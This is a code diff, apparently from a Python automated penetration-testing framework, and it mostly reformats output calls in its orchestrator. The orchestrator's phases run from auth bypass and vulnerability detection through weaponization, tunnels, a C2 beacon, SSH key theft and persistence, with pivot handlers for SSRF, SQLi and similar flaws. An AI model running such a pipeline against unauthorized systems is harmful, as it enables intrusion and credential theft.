-            cur.execute(
-                "UPDATE sessions SET report=?, updated_at=? WHERE id=?",
-                (json.dumps(report), time.time(), self._storage.session_id()),
-            )
-            self._storage._conn.commit()
-        except Exception as e:
-            logger.debug("save report: %s", e)
-
     def run(self) -> Dict:
         start = time.time()
+        if not self._resumed:
+            self.context_memory.begin_run(self.target)
         self.oob_server.start()
 
         self.phase_recon()
         self.phase_attack_plan()
         self.phase_reason()
 
-        print("[*] Phase 2/9: Crawling %s ..." % self.target)
+        progress("[*] Phase 2/9: Crawling %s ..." % self.target)
         crawl_result = self.phase_crawl()
         cs = crawl_result.get("summary", {})
         spa_tag = " [SPA]" if cs.get("is_spa") else ""
         extra = ""
         if cs.get("js_api_discovered", 0):
             extra = ", %d JS API routes" % cs.get("js_api_discovered", 0)
-        print("  -> %d pages, %d endpoints%s, %d params%s" % (
-            cs.get("pages_crawled", 0), cs.get("endpoints_found", 0),
-            extra, cs.get("unique_params", 0), spa_tag))
+        progress(
+            "  -> %d pages, %d endpoints%s, %d params%s"
+            % (
+                cs.get("pages_crawled", 0),
+                cs.get("endpoints_found", 0),
+                extra,
+                cs.get("unique_params", 0),
+                spa_tag,
+            )
+        )
 
         if cs.get("is_spa") and PlaywrightEngine.is_available():
-            print("[*] SPA detected, launching browser-based crawler ...")
+            progress("[*] SPA detected, launching browser-based crawler ...")
             try:
                 spa_result = crawl_spa(self.target)
                 if spa_result.get("api_routes"):
-                    print("  -> %d API routes, %d JS routes discovered via browser" % (
-                        len(spa_result.get("api_routes", [])),
-                        len(spa_result.get("js_api_routes", [])),
-                    ))
+                    progress(
+                        "  -> %d API routes, %d JS routes discovered via browser"
+                        % (
+                            len(spa_result.get("api_routes", [])),
+                            len(spa_result.get("js_api_routes", [])),
+                        )
+                    )
                     crawl_result["spa_crawl"] = spa_result
                     self.state["phases"]["crawl"] = crawl_result
                     for ep in spa_result.get("api_routes", []):
                         if ep not in crawl_result.get("endpoints", {}):
                             crawl_result["endpoints"][ep] = {
                                 "url": "%s%s" % (self.base_target, ep),
-                                "methods": ["GET"], "params": [], "spa_api": True,
+                                "methods": ["GET"],
+                                "params": [],
+                                "spa_api": True,
                             }
             except Exception as e:
                 logger.debug("spa crawl: %s", e)
 
-        print("[*] Phase 3/9: Parameter mining ...")
+        progress("[*] Phase 3/9: Parameter mining ...")
         mine_result = self.phase_mine(crawl_result)
-        total_mined = sum(len(pd.get("all_params", [])) for pd in mine_result.values() if isinstance(pd, dict))
-        print("  -> %d params discovered across %d endpoints" % (total_mined, len(mine_result)))
+        total_mined = sum(
+            len(pd.get("all_params", [])) for pd in mine_result.values() if isinstance(pd, dict)
+        )
+        progress("  -> %d params discovered across %d endpoints" % (total_mined, len(mine_result)))
 
-        print("[*] Phase 4/9: Auth bypass probing ...")
+        progress("[*] Phase 4/9: Auth bypass probing ...")
         auth_result = self.phase_auth_bypass()
         ab_total = auth_result.get("total_bypasses", 0)
-        print("  -> %d bypass vectors (%d path, %d cookie, %d header, %d method)" % (
-            ab_total,
-            len(auth_result.get("path_bypasses", [])),
-            len(auth_result.get("cookie_bypasses", [])),
-            len(auth_result.get("header_bypasses", [])),
-            len(auth_result.get("method_bypasses", [])),
-        ))
+        progress(
+            "  -> %d bypass vectors (%d path, %d cookie, %d header, %d method)"
+            % (
+                ab_total,
+                len(auth_result.get("path_bypasses", [])),
+                len(auth_result.get("cookie_bypasses", [])),
+                len(auth_result.get("header_bypasses", [])),
+                len(auth_result.get("method_bypasses", [])),
+            )
+        )
 
-        print("[*] Phase 5/9: Vulnerability detection (%d threads) ..." % self.threads)
+        progress("[*] Phase 5/9: Vulnerability detection (%d threads) ..." % self.threads)
         findings = self.phase_detect()
         by_type = {}
         for f in findings.values():
             by_type.setdefault(f["type"], 0)
             by_type[f["type"]] += 1
         by_type_str = " ".join("[%s:%d]" % (k.upper(), v) for k, v in sorted(by_type.items()))
-        print("  -> %d vulnerabilities found: %s" % (len(findings), by_type_str))
+        progress("  -> %d vulnerabilities found: %s" % (len(findings), by_type_str))
 
-        print("[*] Phase 5b/9: Deep response intelligence gathering ...")
+        progress("[*] Phase 5b/9: Deep response intelligence gathering ...")
         self.phase_ai_hunt()
 
-        print("[*] Phase 6/9: Attack chain pivoting ...")
+        progress("[*] Phase 6/9: Attack chain pivoting ...")
         pivot_result = self.phase_pivot()
         pivot_actions = len(pivot_result.get("pivot_actions", []))
         if pivot_actions:
-            print("  -> %d chain pivot actions executed" % pivot_actions)
+            progress("  -> %d chain pivot actions executed" % pivot_actions)
         else:
-            print("  -> No chain pivots triggered")
+            progress("  -> No chain pivots triggered")
 
         exploits = {}
         if findings or ab_total > 0:
             if self.high_priv_sess:
-                print("[*] Phase 6b/9: Dual-session BOLA detection ...")
+                progress("[*] Phase 6b/9: Dual-session BOLA detection ...")
                 self.phase_dual_session()
-            print("[*] Phase 7/9: Weaponization (%d threads) ..." % self.threads)
+            progress("[*] Phase 7/9: Weaponization (%d threads) ..." % self.threads)
             exploits = self.phase_weaponize()
             ex_ready = len([e for e in exploits.values() if e.get("exploit_ready")])
-            print("  -> %d exploit paths (%d ready)" % (len(exploits), ex_ready))
+            progress("  -> %d exploit paths (%d ready)" % (len(exploits), ex_ready))
 
         if exploits:
-            print("[*] Phase 8/9: Advanced exploitation (tunnel/C2/lateral) ...")
+            progress("[*] Phase 8/9: Advanced exploitation (tunnel/C2/lateral) ...")
             adv = self.phase_advanced(exploits)
             if adv.get("tunnels"):
-                print("  -> %d tunnel agents deployed" % len(adv["tunnels"]))
+                progress("  -> %d tunnel agents deployed" % len(adv["tunnels"]))
             if adv.get("c2_active"):
-                print("  -> C2 beacon agent active")
+                progress("  -> C2 beacon agent active")
             if adv.get("ssh_keys"):
-                print("  -> %d SSH keys stolen" % len(adv["ssh_keys"]))
+                progress("  -> %d SSH keys stolen" % len(adv["ssh_keys"]))
             if adv.get("post_exploit"):
-                print("  -> Post-exploitation persistence generated")
+                progress("  -> Post-exploitation persistence generated")
 
-        print("[*] Phase 9/9: Pipeline (asset graph -> crown jewels) ...")
+        progress("[*] Phase 9/9: Pipeline (asset graph -> crown jewels) ...")
         self.phase_pipeline()
 
         report = self.phase_report()
@@ -1949,23 +2165,39 @@ class Orchestrator:
 
 # Populate pivot handler dispatch table after class is defined.
 # Each handler: (self, vuln_list, chain, pivot_results) -> set[str] of chain_names_used.
-_PIVOT_HANDLERS.update({
-    "ssrf_pivot": Orchestrator._pivot_handle_ssrf,
-    "lfi_pivot": Orchestrator._pivot_handle_lfi,
-    "sqli_pivot": Orchestrator._pivot_handle_sqli,
-    "jwt_pivot": Orchestrator._pivot_handle_jwt,
-    "auth_pivot": Orchestrator._pivot_handle_auth,
-    "deser_pivot": Orchestrator._pivot_handle_deser,
-    "graphql_pivot": Orchestrator._pivot_handle_graphql,
-})
+_PIVOT_HANDLERS.update(
+    {
+        "ssrf_pivot": Orchestrator._pivot_handle_ssrf,
+        "lfi_pivot": Orchestrator._pivot_handle_lfi,
+        "sqli_pivot": Orchestrator._pivot_handle_sqli,
+        "jwt_pivot": Orchestrator._pivot_handle_jwt,
+        "auth_pivot": Orchestrator._pivot_handle_auth,
+        "deser_pivot": Orchestrator._pivot_handle_deser,
+        "graphql_pivot": Orchestrator._pivot_handle_graphql,
+    }
+)
 
 
-def run(target: str, sess: Optional['requests.Session'] = None,
-        timeout: float = 10.0, threads: int = 10,
-        high_priv_sess: Optional['requests.Session'] = None,
-        fast_recon: bool = True, time_budget: Optional[float] = None,
-        high_value: bool = False, opsec: bool = False) -> Dict:
-    o = Orchestrator(target, sess, timeout, threads,
-                     high_priv_sess=high_priv_sess, fast_recon=fast_recon,
-                     time_budget=time_budget, high_value=high_value, opsec=opsec)
+def run(
+    target: str,
+    sess: Optional["requests.Session"] = None,
+    timeout: float = 10.0,
+    threads: int = 10,
+    high_priv_sess: Optional["requests.Session"] = None,
+    fast_recon: bool = True,
+    time_budget: Optional[float] = None,
+    high_value: bool = False,
+    opsec: bool = False,
+) -> Dict:
+    o = Orchestrator(
+        target,
+        sess,
+        timeout,
+        threads,
+        high_priv_sess=high_priv_sess,
+        fast_recon=fast_recon,
+        time_budget=time_budget,
+        high_value=high_value,
+        opsec=opsec,
+    )
     return o.run()
